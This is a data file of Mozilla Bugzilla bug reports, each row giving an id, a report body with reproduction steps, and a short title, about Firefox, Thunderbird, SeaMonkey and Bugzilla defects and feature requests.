6708,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060415 Firefox/2.0a1 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060415 Firefox/2.0a1  Please see image included for for the exact error message.  Reproducible: Always  Steps to Reproduce: 1. Open Places 2. In the left hand plane, use the + sign by a feed to expand it. 3. Click on one of the sub-items to get the error message.  Actual Results:   An error message resulted.  Expected Results:   No error should occur.",Assertion Failed message when selecting feed or bookmark from left hand plane in places.
6759,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.1a+) Gecko/20020714 BuildID:    2002071420  When going to the listed URL, the page is rendered incorrectly (see attached screen shot, gc-1stload.png) with some text appearing in the top bar. Reloading the page solves the problem, though sometimes two reloads are necessary.  Also seen on fairly recent Windows builds.   Reproducible: Always Steps to Reproduce: 1. Go to this URL: http://www.geekculture.dk/arkiv.php3?reviewid=1230 2. Notice how it looks bad 3. Push the reload button 4. Notice how it looks good (if not, repeat from 3)  If there is no problem on first load, try selecting other articles from http://www.geekculture.dk/ and see if it happens. (Sorry, the contents of the site are in Danish only.)  Actual Results:  First load looks weird (as in gc-1stload.png), second load is fine (as in gc-2ndload.png).   Expected Results:  Even first load should look fine.  I have verified the source code on first and second load and this is the very same code so the server is not generating different pieces of code.  This happens using both classic and modern theme. Not tested with other themes.","{inc}clear (from <br clear=""all"">) lost on incremental reflow"
6778,"Sometimes, when changing a bug, Bugzilla has to display an intermidiate page.  Examples include specifying the component/version/milestone when a product is changed, the user logging in, resolving ""mid-air collisions"", and confirming duplicates.  In that intermediate page, Bugzilla needs to save the changes the user wanted to make.  However, for fields with multiple values, e.g., the CC lists, these values are munged.  All the values are concatenated together into one value.  To see this in action, take a bug with CCs.  Change the product and remove a couple of CCs at the same time, so you get the ""verify component/version/milestone"" page.  Once you specify these values, you get an error, because ""user1@domain.comuser2@domain.netuser3@example.org"" is not a registered Bugzilla account.  Note that this was noticed in bug 101056.  But it was only noticed and fixed for the case where this user has to log in before committing his change.  It still exists in the other cases.  I discovered this bug in 2.14, but it still exists in 2.16.  I have a fix for this, and I will be submitting them.","Bug changes with intermediate pages munges fields with multiple values (e.g., CC)"
6842,The handling of kRustInactive is not correct. Also direction specified should come from the Rust parser.,Fixup RsdparsaSdpAttributeList::LoadExtmap
6913,"Most popular web-based applications have a web-based setup tool. We are somewhat unique (or behind the times, if you want to look at it that way) in that our setup tool works entirely and only from the command line, and *then* after you install you have to go to the editparams page and set things up properly.  I think that we could definitely have a setup.cgi that ran necessary setup for Bugzilla, and possibly also presented a form with the basic params that *everybody* needs to configure.  If this was your first time running setup.cgi, it could ask you for the basic localconfig info (like the db username and pass), and then go off and do its thing.  Otherwise, it would require you to log in as somebody in the admin group.",Web-Based Installation Tool For Bugzilla
6916,"Trunk 2002-02-04: WinMe  This is probably a dupe but I couldn't find the orignal bug.  Overview: ""Send Later"" fails after deleting the default account in this case. Since there is no way in the UI to define an Unsent Messages folder the user can never use the ""Send Later"" feature for this profile.  Steps to reproduce: 1. In Comm 4.x open a profile with a POP account 2. In 4.x create a message and do a Send Later (you'll notice that the account has an Unsent Messages folder) 3. Select File|Unsent Messages 4. Exit from 4.x 5. Migrate the same profile into 6.x (Unsent Messages folder is still in the POP account) 6. Add a second mail account to the profile so 2 mail accounts are present (now both accounts will use the Unsent Messages folder in the first POP account when performing a Send Later) 7. Delete the first POP account 8. Create a message and select File|Send Later  Actual Results: It fails because it can't find the Unsent Messages folder, even though another one exists under Local Folders.  Exit/Restart the app and the problem still exists. There is no way to define another Unsent Messages folder  Workaround: I don't see an obvious workaround in the UI. Is there a pref that can be edited or added?  Expected Results: If it can't find an Unsent Messages folder then it should use the one that is under Local Folders or give me the option in the prefs to define an Unsent Messages folder.","""Send Later"" fails after deleting the default account in this case, can't define another Unsent Messages folder"
6921,"When I get the following email:  This bug depends on bug 3271, which changed state:             What    |Old Value                   |New Value ----------------------------------------------------------------------------              Status|RESOLVED                    |REOPENED          Resolution|FIXED                       | It should also link or provide a link to the original bug which has changed states. Currently it provides a link only to the bug that was watching the other bug. (bug 2363 in this case)",Notification of dependency bugs should include link to original bug
7109,"As a forum contributor I want to have a view that shows me which threads need attention right now.  Currently we are telling people about the threads that didn't get a reply within the last 24 hours, but that list is often empty or not actionable. We should provide another view that lists threads where the original poster is the last one to reply.   The open question here is: Do we show all threads where the original poster is the last one to reply or only those where the original contributor hasn't responded within x hours?",Highlight threads needing attention for forum contributors
7138,"[User Story] As a product team, we want to know how many users use ""Preferences"" and their behaviors so that we can make informed decisions about this feature  [Acceptance Criteria] 1. Out of all the users that are active in a month, we know the % of them who access ""Preferences"" 2. Out of all the users who access ""Preferences"" in a month, we know how many times they acess to ""Preferences""  3. We know how many total access to ""Preferences"" in a month 4. We know the % of users go to ""Preferences"" by clicking on hamburger menu/ about:home/ menu bar (actively) instead of clicking on buttons in prompts (passively)? 5. For all the users who access to ""Preferences"" in a month, we know how many go to ""General"", ""Search"", ""Content"", ""Applications"", ""Privacy"", ""Security"", ""Sync"", and ""Advanced""",[Telemetry User Story] Preferences
7191,More details to follow as we triage.,Stop using sdk/event/core in actors/performance-entries.js
7220,"It would be great to have rudimentary mochitests of codecs to catch regressions.  We can force a codec by fiddling with the sdp, then we verify the content at the receiver like we do in many other tests.",Add mochitests for codecs
7268,"Now that a few local targets are being listed in about:debugging, we should display remote devices as well, and allow a user to connect to them in order to show their debuggable targets.  We should show: - Devices accessible via USB (Firefox OS, Fennec, Chrome/iOS webviews, ...) - Devices accessible over Wi-Fi - Devices accessible through Firefox Accounts? (this would need fxaccount work) - Installed Simulators - Other browsers like Chrome, Safari, ...  Along with a ""Connect"" or ""Launch"" button. Once that button is clicked, Firefox should connect to that device, and request a list of all its debuggable targets, e.g.: - Open tabs - Apps - Add-ons - Workers - etc.",[meta] Enable remote debugging in about:debugging.
7359,*Affected versions* * 67.0 * 68.0b7 * 69.0a1 (2019-06-04)  *Affected platforms* * Windows 10x64 * Windows 7x64  *Steps to reproduce* 1. Launch Firefox  2. Access https://mozilla.github.io/webrtc-landing/gum_test.html 3. Access the Screen/Window option  *Expected result* * Screen/Window share is successfully displayed  *Actual result* * Black screen is displayed in both cases for some applications (e.g. Chrome & Skype)  *Regression range* * This is not a recent regression since I was able to reproduce it on Firefox 67.0. I'll came with regression range asap in case there is an old one.,Screen/Window share on getUserMedia test page displays black page
7395,"https://searchfox.org/mozilla-central/rev/153feabebc2d13bb4c29ef8adf104ec1ebd246ae/dom/base/Document.cpp#2561  Called (two levels deep) from Document::StartDocumentLoad.  This queries the principal of the parent document for whether it's a system principal.  If the parent is NOT a system principal, then the a downgraded principal is returned.  This seems like a good candidate for a flag on the BrowsingContext.  Knowing whether your parent document (or some ancestor) has the system principal or not should not be sensitive.",Audit usage of nsIDocShellTreeItem in MaybeDowngradePrincipal
7431,"[This WebM](https://giant.gfycat.com/DefinitiveNippyHornbill.webm) is rendered with a 45 degrees *skew* on macOS in Nightly, see the attached screenshot. This works fine in Release and on Windows in Nightly. Running mozregression returned [this push](https://hg.mozilla.org/integration/mozilla-inbound/pushloghtml?fromchange=824a86797c8ecbb1a6395ac9fd76ad6abe724766&tochange=040b3a4dc232ee725c756dc054bc23f1baae26d2), and bug 1479145 jumps out as something that could be related.  Requesting tracking for 67 and 68, because the issue is reproducible in 67, and the patch in question got uplifted.",WebM rendered skewed on macOS
7449,"STEPS TO REPRODUCE:  1) Set BL_ATTEMPTS to a number > 2 in jstracer.cpp (I can reproduce the bug with    it set to 3, but 32 is a good number to try). 2) Recompile your optimized shell. 3) Run it on https://bugzilla.mozilla.org/attachment.cgi?id=377491  EXPECTED RESULTS: Game runs to end and outputs some stats about time taken  ACTUAL RESULTS: foo.js:101: TypeError: myBoard.chainTouchingCountsByChainIdAndStone[i.chainId] is undefined  I wish I had a smaller testcase to offer here...  :(",TM: incorrect execution if too little blacklisting happens
7456,"[Affected versions]: Firefox 56.0a1 (2017-07-18)  [Affected platforms]: Windows 10 64-bit Ubuntu 16.04 32-bit  [Steps to reproduce]: 1.Launch Firefox with a clean profile. 2.Make sure that  ""extensions.webextensions.remote” pref is set to true. 3.Install the following webextension: https://addons.mozilla.org/ro/firefox/addon/screenshot-capture-annotate/?src=ss 4.Navigate to a new webpage (e.g. https://www.amazon.com/) 5.Click on the webextension icon from toolbar. 6.Select any option from the list.   [Expected Results]: The webextension options work without any issue.   [Actual Results]: - Capture tabs are never loaded. - This issue is not reproducible with ""extensions.webextensions.remote” pref is set to false. - The following error appears in Browser Console:  Unchecked lastError value: Error: Could not establish connection. Receiving end does not exist. ExtensionCommon.jsm:306 - See attached screenshot.  [Regression Range]: Last good revision: 8f80d594c08d5c7a112e5d4b9eb44ffca717eb7b First bad revision: 6190181ff4093756d3f8df754109ed16d132d215 Pushlog: https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=8f80d594c08d5c7a112e5d4b9eb44ffca717eb7b&tochange=6190181ff4093756d3f8df754109ed16d132d215   [Additional notes]: Considering that extensions.webextensions.remote is false on Firefox 55 I will mark this version as disabled.",<script>s referencing non-existent moz-extension: scripts never resume parsing with protocol remoting enabled
7474,"User-Agent:       Mozilla/5.0 (Windows NT 5.1; rv:2.0b12) Gecko/20100101 Firefox/4.0b12 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0b12) Gecko/20100101 Firefox/4.0b12  In Arabic langage the ""Shedda , Fatha , Dhamma ..."" sould appear on top of letters and not in the side for more explanation ;try to write this word ""المَدرَسَةُ"" in Firefox 4 beta 12 and in an older version like firefox 3.6.x  Reproducible: Always",Firefox 4 beta 12 don't show arabic langage correctly
7525,"From Bugzilla Helper: User-Agent: Internet Explorer BuildID:    2000072520  The home button stops functioning if the home page is set to an ip-adress with  an custom port.  Reproducible: Always Steps to Reproduce: 1. Set the home page of mozilla to something like 127.0.0.1:10106 (or whereever  you have access to a webserver which does not use the default port 80. It seems  that you have to enter the ip-address. Using the DNS name works. 2. Stop Mozilla 3. Restart Mozilla 4. The homepage loads. 5. Press home on the toolbar or use the home menu item.   Actual Results:  6. The status bar displays ""Connecting to [ip]..."" 7. Nothing happens. (The browser doesn't do redraws anymore). (8. You may go to the URL-bar and press enter to reload the homepage)				  Expected Results:  Pressing the home-button should load the start page.							  Looks to me as if there is a problem with DNS vs. ip names - like if some  components don't recognize that 127.0.0.1 is an ip-address and not a DNS name.  But I may be wrong in this point.  BTW.: There is a related error - which might be just a symptom of the same bug,  so I don't file a separate report. If the startpage is set to localhost:port AND port is not the standard port AND  there is no web-server running at localhost:port _then_ Mozilla tries to connect  to keyword.netscape.com.",home does not work if set to ip:port
7558,"Created attachment 8859195 error screen shot  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20170323105023  Steps to reproduce:  I'm on firefox 52.0.2 (64 bit). says up to date. I tried to create indexedDb in this codepen: https://codepen.io/anon/pen/ybYjNK?editors=1111   Actual results:  nothing happened, it logged error in console when opening indexedDb. when checking storage in developer tools, nothing is under indexedDb.   Expected results:  indexedDb should be created. The codepen provided seems to work in nightly and developer's edition but just not the regular version. I don't know if it's something with my local installation or if the entire batch is like this.",Profiles used with Firefox 55 will no longer work with older versions of the browser
7733,User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030312 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030312  The body of the article on this and most other pages at the al-Jazeera web site does not show up in Mozilla.  It shows up in IE and in konqueror.  Reproducible: Always  Steps to Reproduce: 1. turn to the al-Jazeera news pages 2. 3.  Actual Results:   pages missing body  Expected Results:   shown the articles,body of article on page does not show up
7738,"Here are the steps for 1.5. Most of these are independent, so they can be done asyncronously (db changes before code changes, though!).  1) Alter the nodes db as described in Bug 599133. Update the rows in the db to fill in the new columns.  2) Alter the prod db to add a column ttl int(11). At this time, we can also drop that redundant index (and might want to consider indexing ttl for fast table deletes)  3) grab a copy of http://hg.mozilla.org/services/server-node-assignment/ somewhere in a build directory.   [tarek, please add details on how to build and deploy this here]  Edit /etc/mozilla-services/syncnodes.cfg to point to the correct db and to create a secret. At this point, it should pass all the tests.  Add a line to the apache config to point at the wsgi file. (something like WSGIScriptAlias /nodeadmin /home/apache/server-node-assignment/syncnodes.wsgi) Make sure this has all the appropriate firewall protection.  4) Shut down a webserver. Update the weave-sync hg. You should see the 1.0 folder disappear and a 1.1 folder appear.  Edit the apache conf to point /1.0 at the new 1.1 folder instead. Add another line that points /1.1 at the new 1.1 folder.  Restart apache and bring the server back up.",push sync-server 1.5
7767,"User-Agent:       Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; .NET4.0C) Build Identifier: 4.0b7  A subclass of Array stops reporting the right length when an additional method is added to its prototype.  This is a regression in 4.0b7, and is confirmed to work as expected in 4.0b6 and 3.5.  Reproducible: Always  Steps to Reproduce: Use the following code:    function MyArray() {}   MyArray.prototype=new Array();   MyArray.prototype.item=function (x) { return this[x]; }    var arr=new MyArray();   arr.push(""foo"");   alert(arr.length);  Actual Results:   Alerts 0 in 4.0b7, alerts 1 in 4.0b6 and 3.5.  Expected Results:   Should alert 1.",Classes extending Array don't work
7800,"I'm not sure of the terminology here.  There is a bar beneath the nagivation buttons and the address bar where the 'Home' shortcut is.  You can also add shortcuts to it by dragging from the little icon to the left of the URL.  This is not working for me.  I drag with the hand, but the shortcut never appears in the bar.  There is also no ""Personal Toolbar"" folder so I can't add them that way.  There is another 'bookmark' bug about not saving bookmarks and I think this might be related.",Bookmarks not created on shortcut bar
7912,"Do shift-reload a few times (3 times here) ... then at the last time the  status bar remains ""transferring data from www.aftonbladet.se ..."" and the CPU  usage remains 100%! If you go now for example to www.mozilla.org there is this message in the  status bar ""transferring data from www.mozilla.org ..."" with cpu usage all the  time at 100%. Mozilla then never get's down again.  using trunk build 2002062508 on win-xp",CPU remains at 100% after www.aftonbladet.se
7922,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20021016 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20021016  After upgrading to Moz 1.2b downloads fail to initialise. All attempts, with download managed turned on or off, clicking on a download link fails to do anything  Also happens in news & mail when trying to open an attachment  Reproducible: Always  Steps to Reproduce: 1. go to site to download 2. click on link of download 3. watch as nothing happens  Actual Results:   nothing  Expected Results:   started download of file",Download fails to initialise. Nothing happens
7969,"User-Agent:        Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7a) Gecko/20040219 Firefox/0.8.0+  When I try to login to some websites I find that clicking the submit button does not work.  I currently can't login to Paypal at all in Firefox and I have no idea why.  This seems to have broken in the last week or so.  I have experianced this problem intermittently for the past several months on various websites, including Best Buy's search (though that seems to have corrected itself somehow, maybe they changed the code on the page).  There does not appear to be any javascript involved in the Paypal logon form (I only checked quickly), and when I click the button absolutely nothing happens.  There is no indication that the page was submitted and no length of time waiting makes any difference.  My JS console does not show any errors and I don't have any other examples of malfunctioning forms right now.  Reproducible: Always Steps to Reproduce: 1. Go to https://www.paypal.com 2. Enter an email address and password (invalid or valid, doesn't really matter) 3. Click submit  Actual Results:   Nothing happens  Expected Results:   Form should submit (as in Internet Explorer) and you should be forwarded to your account (or a relogon page if you typed your password wrong).",Forms will not submit due to password file corruption
7974,"User-Agent:       Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.5) Gecko/20040130 Firebird/0.7 Build Identifier: Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.5) Gecko/20040130 Firebird/0.7  The web application is a image database. Not all images display in latest Mozilla and Firefox. Worked fine with older versions (e.g. Firebird)  Reproducible: Always Steps to Reproduce: 1. Goto easydb9.programmfabrik.de 2. Press ""Gast"" 3. Press ""Suchen""   Actual Results:   Not all the jpegs are displayed.  Expected Results:   All the jpegs should display.",JPEGS sometimes dont display
7986,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040207 Firefox/0.8 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040207 Firefox/0.8  If I run on my local machine firefox, telnet to another linux box on the LAN and start there mozilla I do not get on my local machine remote mozilla session. I get another copy of the local firefox session.  Yes, I know...  it sounds very confusing.  I do not know how to describe it better. Please follow ""Steps to Reproduce"" and the picure will become CLEAR.  I am not sure if this is related to firefox-->mozilla only or to all combinations of browsers which are based on ""mozilla"".  The main reason I am reporting this bug is very simple. I have noticed this strange behavior few times at my work. I have not had time to investigate it.  But now, I can reproduce this bug any time I want. I've build a small home LAN today (RH6.2, RH 9.0, RH 8.0). This is a controlled enviroment.  There is a work around for this bug. If I want to have two separate browser sessions, one on local machine and the other on remote machine, I have to start browser first on remote machine and then on local machine.  Of course, I want to have BOTH browser sessions on the same physical screen (aka my local machine).  In case it matters. I have on both machines the same ID (login name).   Reproducible: Always Steps to Reproduce: 1. open xterm 2. type ""xhost +"" ( withot quotes ) 3. start firefox  4. telnet to the remote machine 5. set DISPLAY variable ( example: export  DISPLAY=192.168.3.12:0.0 ) Assuming that your local IP address is 192.168.3.12. 6. start mozilla on remote machine    Actual Results:   On the local machine another firefox window will open. This browser DOES NOT run on the remote machine. How do I know that ?  Very simple answer: click on Help-->About Mozilla Firefox and write down version  Expected Results:   I should get on my local display a mozilla session which runs on remote machine  As I said already, there is a simple work around. If I start browser on the remote machine first and THEN I start local browser, EVERYTHING IS FINE.",starting mozilla on remote machine brings up local browser
8048,User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8b2) Gecko/20050415 Firefox/1.0+ Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8b2) Gecko/20050415 Firefox/1.0+  Cannot resize sidebar by dragging with pointer.   Reproducible: Always  Steps to Reproduce: 1. Menu View -> Sidebar -> Bookmarks 2. Use mouse to change width of sidebar 3.  Actual Results:   Sidebar is stuck at fixed width.  Expected Results:   Should be able to change width of sidebar.  This worked correctly on the April 12 build.,Sidebar resize broken on Firefox nightly 04/15/05
8223,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7  On many sites, Firebird keeps popping up the Windows connect dialog to get me to connect to an ISP, even though I'm already connected to a network (wireless, or sometimes cable modem). I think it only asks this on sites when it loads them but finds a link that it can't load (or times out). Then it thinks that it must be disconnected from the internet, even though it's not. This is a problem because it happens on many sites and I think it often occurs when the adserver for some ads on the page was down. It does this on aol.com, cnn.com, itunes.com, monster.com, and others.  Doesn't occur on: slashdot.org, real.com, mail.com, google.com, altavista.com, yahoo.com.  This does not happen on the same sites in internet explorer. Please let me know if you can fix this.    Reproducible: Always  Steps to Reproduce: 1. Go to any of a number of sites (aol.com, cnn, etc) that have ads or other links that are unreachable or time out.  2. 3.  Actual Results:   Browser pops up a Windows connection dialog (titled ""Network Connection"" and says ""Choose a connection"" and has a drop down box of my ISP connections) and I have to click cancel.   Expected Results:   Not popped up a connection dialog.",incorrectly prompts for internet connection
8293,"See upcoming testcase. This crashes current Firefox builds (1.8.1 branch and trunk) when the Firebug extension is installed and running.  This regressed on trunk between 2006-05-25 and 2006-05-26. On branch, the regression happened between 2006-06-06 and 2006-06-26. I think this regressed with bug 206520.  Talkback ID: TB21297965H ClassifyWrapper   nsDOMClassInfo::BeginGCMark   nsDOMClassInfo::MarkReachablePreservedWrappers   nsDOMGCParticipantSH::Mark   XPC_WN_Helper_Mark   js_Mark   MarkGCThingChildren   MarkGCThingChildren   MarkGCThingChildren   js_MarkGCThing   js_GC   js_ForceGC   NS_ProcessNextEvent_P   nsBaseAppShell::Run   0x00392aac 0xccccc3c0  Of course, maybe this is not Mozilla's fault, and is Firebug doing something wrong.",Crash [@ ClassifyWrapper] with xmlhttprequest and NS_ERROR_FILE_NOT_FOUND when Firebug extension is installed
8299,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.8.0.6) Gecko/20060729 SeaMonkey/1.0.4 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.8.0.6) Gecko/20060729 SeaMonkey/1.0.4  seamonkey crashes completely down when I change from one profile to the other. Mozilla 1.7.13 does it best (same profiles).  Reproducible: Always  Steps to Reproduce: 1. start seamonkey 2. change profile  Actual Results:   crash down (disappears completely)   Expected Results:   change profile (like Mozilla 1.7.13 on same PC, same folders)  not a new bug",seamonkey crashes completely down when I change from one profile to the other
8331,"Using Build ID: 2002053004 Steps to reproduce problem: 1. Open the JS console 2. Type ""&lt;"" (including the quotes) 3. Press Eval  Expected results: console displays &lt;  Actual results: console displays <",JS console eval doesn't handle special HTML characters
8355,"The following testcase asserts on mozilla-central revision 5a9ac6fed6ff (run with --fuzzing-safe):   gczeal(9, 2) serialize(Boolean, Boolean.prototype.valueOf());","Assertion failure: table, at dist/include/js/HashTable.h:1353 or Crash [@ Range]"
8364,"I had my first hang for several months today with yesterday's build of Mozilla 20020820. A stacktrace from the hung process yields  (gdb) bt #0  0xfea65e88 in __lwp_park () #1  0xfea61c10 in mutex_lock_queue () #2  0xfea62610 in slow_lock () #3  0xfefcfc78 in PR_Lock (lock=0xb26b98) at ptsynch.c:190 #4  0xfcb545f0 in nsAutoLock::nsAutoLock () #5  0xfcb448c8 in nsDiskCacheDevice::DoomEntry () #6  0xfcb3f024 in nsCacheService::DoomEntry_Internal () #7  0xfcb3ef80 in nsCacheService::DoomEntry () #8  0xfcb432fc in nsDiskCacheEvictor::VisitRecord () #9  0xfcb4734c in nsDiskCacheBucket::VisitEachRecord () #10 0xfcb4888c in nsDiskCacheMap::EvictRecords () #11 0xfcb45a24 in nsDiskCacheDevice::EvictDiskCacheEntries () #12 0xfcb44f98 in nsDiskCacheDevice::OnDataSizeChange () #13 0xfcb3fd44 in nsCacheService::OnDataSizeChange () #14 0xfcb38320 in nsCacheEntryDescriptor::RequestDataSizeChange () #15 0xfcb3a250 in nsCacheEntryDescriptor::nsOutputStreamWrapper::OnWrite () #16 0xfcb3a020 in nsCacheEntryDescriptor::nsOutputStreamWrapper::Write () #17 0xff0cc24c in nsInputStreamTee::TeeSegment () #18 0xff0cc360 in nsInputStreamTee::WriteSegmentFun () #19 0xff0d16d4 in nsPipe::nsPipeInputStream::ReadSegments () #20 0xff0cc8c0 in nsInputStreamTee::ReadSegments () #21 0xfcb14c50 in nsGIFDecoder2::WriteFrom () #22 0xfd681d00 in imgRequest::OnDataAvailable () #23 0xfd67e964 in ProxyListener::OnDataAvailable () #24 0xfd67f928 in httpValidateChecker::OnDataAvailable () #25 0xfe562ad4 in nsStreamListenerTee::OnDataAvailable () #26 0xfe5bdba0 in nsHttpChannel::OnDataAvailable () #27 0xfe561748 in nsOnDataAvailableEvent::HandleEvent () #28 0xfe5476b4 in nsARequestObserverEvent::HandlePLEvent () #29 0xff0f6e1c in PL_HandleEvent (self=0x18f7170) at plevent.c:596 #30 0xff0f6d38 in PL_ProcessPendingEvents (self=0x83808) at plevent.c:526 #31 0xff0f822c in nsEventQueueImpl::ProcessPendingEvents () #32 0xfe33154c in event_processor_callback () #33 0xfe3310a4 in Letext () #34 0xfeda6c10 in g_main_dispatch () #35 0xfeda7424 in g_main_iterate () #36 0xfeda7660 in g_main_run () #37 0xfee8fde8 in gtk_main () #38 0xfe331c38 in nsAppShell::Run () #39 0xfe3bbac4 in nsAppShellService::Run () #40 0x1f2c0 in main1 () #41 0x204f0 in main () (gdb) quit   Possibly a OS (Solaris) but, but added to bugzilla for future reference. Will add coments if i can reproduce this with todays build (21st August)",deadlock when disk cache fills up [was: Mozilla hangs in PR_Lock at ptsynch.c:190]
8365,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11 Build Identifier: Testopia 1.2, Bugzilla 2.22.2  When I attempted to create a test run using existing environments, the Environment combo box is empty and stays empty. If I attempt to enter an Environment ID manually, it is erased by the browser script logic. This prevents me from creating a test plan with an existing Environment.   Reproducible: Always  Steps to Reproduce: 1. Click the 'New Run' link 2. If prompted (i.e. not already on a Test Plan), select an existing Test Plan 3. At the bottom of the New Run page (attributes), the Combo Box for listing current environments will not populate.   Actual Results:   Blank combo box on Environment. Test Run will not create unless I enter text in the New box.  Expected Results:   The current list of Environments should appear in the combo box.  After looking in the code, the only thing that I could come up with is that it might have something to do with the fact that the New Test Run page uses a run_id of 0 until it is created.   Does the getenv search depend on a valid run_id, or am I just way off base? I have attempted to comment out specific lines of code that make assumptions about the run_id, but that has not helped.",New Test Run Environment Combo Box does not list Environments on initial create page
8439,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.4b) Gecko/20030507 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.4b) Gecko/20030507  The copy and paste functions -- both through drop down menus and via keys -- is not functioning. Checked by performing same functions browser, and all checks okay.  Reproducible: Always  Steps to Reproduce: 1. Linked to any url. 2. Attempt copy via ctrl-c or through dropdown menu; seems ok 3. Attempt to paste into url location or any other program (e.g., notepad, word) does not work.  Actual Results:   No paste.  Expected Results:   Should have transferred copy.",Unable to copy and paste url
8510,"User-Agent:       Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.2b) Gecko/20021024 Build Identifier: Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.2b) Gecko/20021024  When editing some text in a textarea and moving the cursor (up down, left, right) sometimes the cursor gets stuck (preferably at the end of a line) or jump to an unexpected position (when moving around)  This behavior stays as long as the textarea.  Reproducible: Always  Steps to Reproduce: 1. copy some text into a textarea (I copied some text from below into the ""Actual Results"" textarea) 2. move the cursor around: up, down, left, right, to the end of a line and into the middle of it again 3. soon the cursor will jump from a position in the middle of a line to the beginning of the next one (as if the line end was reached) or stick at the end of a line when pressing ""cursor left""   Actual Results:    Add any additional information you feel may be relevant to this bug, such as the theme you were using (does the bug still occur with the default theme?), a Talkback crash ID, or special information about your computer's configuration. Any information longer than a few lines, such as a stack trace or HTML testcase, should be added using the ""Create a new Attachment"" link on the bug, after it is filed.    I only have a solaris workstation with mozilla (1.2beta) here, but IIRC the same bug is present on the Linux version. Don't know about other platforms.  Problems with cursor movement in textareas has a long track with mozilla, with versions around 1.0 and 1.1 being quite stable. Hopefully this problem will be gone again fast.   thanks in advance",cursor movement in textarea broken again
8663,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322) Build Identifier: version 0.6 (20040502)  attachments are not accessable in offline mode for newsgroups. i downloaded all  messages in the newsgroup for offline reading and still no attchements are  accessable. if i save the whole message and open that eml file with for example  outlook express i see the attachments, cos they are downloaded and stored. just  not accessable.  thx crazy  Reproducible: Always Steps to Reproduce: 1. subscribe to newsgroup (forums.talkto.net/glscene.general) 2. mark it for offline use and dl all 3. go into offline mode 4. goto a message with an attachment (image for example, search  for 'screenshoot'in subject) u didnt viewed already! 5. try to save/open the attachment Actual Results:   u get several diffrent error messages depending what u actually try to do with  an attachment  Expected Results:   save/open the attachment",attachments are not accessable in offline mode (for newsgroups)
8676,"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8a2) Gecko/20040610  In an account that is set up to compose messages as HTML, select a message and  Forward As Attachment.  1) the headers are not included in the forwarded text (used to be displayed in a  table), and the ""-------- Original Message --------"" separator is not inluded.  2) if the message has a plain text body, that is not included in the forwarded  text 2.1) if the message has an attachment, the attachment *is* included  3) if the message is multipart/related or multipart/alternative with an HTML  body, that body is included 3.1) if the HTML body has an embedded image, that is included as well  4) if the message is multipart/mixed with an HTML body, the body is not inluded.  Forward As Attachment works fine.  Forward in plain-text mode works as expected  for all messages.","Inline forward, HTML compose: headers, plain body not forwarded"
8688,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10 Build Identifier: Thunderbird 0.8 (20040913)  When retriving mail from one specific POP3 account, I get the following error.  The STAT command did not succeed. Error getting message number and sizes. Mail server ""name of server"" responded: Invalid userid/password.  I had no problems of this kind with previous versions of Thunderbird (since 0.3, up until 0.7.3).  I've also tried retriving mail with Outlook Express and Webmail and there were no problems.  The POP3 server is running IMail 5.08 61785-1.  I have another POP3 account on my own server running Cyrus 2.2.3 and everything works OK.  Reproducible: Always Steps to Reproduce: 1. Check for mail.   Actual Results:   Got the error message described in details above.  Expected Results:   Fetch my mail.","REGRESSION: cant' retrive mail from one POP3 account, others OK"
8807,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060423 BonEcho/2.0a1 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060423 Thunderbird/2.0a1 ID:2006042302  In the account settings dialog, in the left sidebar, there are no children nodes to any of the accounts.  (see screenshot to be attached)  There are no errors in the Javascript Console.  Reproducible: Always  Steps to Reproduce: 1. Go to Tools -> Account Settings 2. Look at the missing detailed options on the sidebar Actual Results:   Missing per-account options on sidebar (see screenshot)  Expected Results:   Displayed all options for each account  This happens with both a clean profile and a well-used one.  This has regressed since build ID: 2006042108",missing per-account options on sidebar
